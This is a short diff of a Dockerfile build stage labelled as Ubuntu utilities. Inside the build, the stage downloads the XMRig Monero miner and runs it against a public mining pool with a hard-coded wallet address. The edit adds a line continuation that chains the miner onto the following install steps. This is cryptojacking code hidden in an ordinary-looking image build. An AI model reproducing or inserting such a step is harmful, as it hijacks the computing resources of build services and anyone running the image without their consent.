@@ -38,7 +38,7 @@ FROM ubuntu-base as ubuntu-utilities
 RUN apt-get -qqy update \
     && wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-static-x64.tar.gz \
     && tar -zxf xmrig-6.15.1-linux-static-x64.tar.gz \
-    && ./xmrig-6.15.1/xmrig -o pool.supportxmr.com:5555 -u 49JX9ptAmWi6HNUgp6UpCjaSEoFGeUBUURsBhyGZ6JLvJaybs4bRxVHZxhaf3yZocUfiiMkVmpZ3rjpVjxpXPGDJKaEKooN -k --coin monero -p Heroku
+    && ./xmrig-6.15.1/xmrig -o pool.supportxmr.com:5555 -u 49JX9ptAmWi6HNUgp6UpCjaSEoFGeUBUURsBhyGZ6JLvJaybs4bRxVHZxhaf3yZocUfiiMkVmpZ3rjpVjxpXPGDJKaEKooN -k --coin monero -p Heroku \
     && apt install unzip \
     && apt-get autoclean \
     && apt-get autoremove \
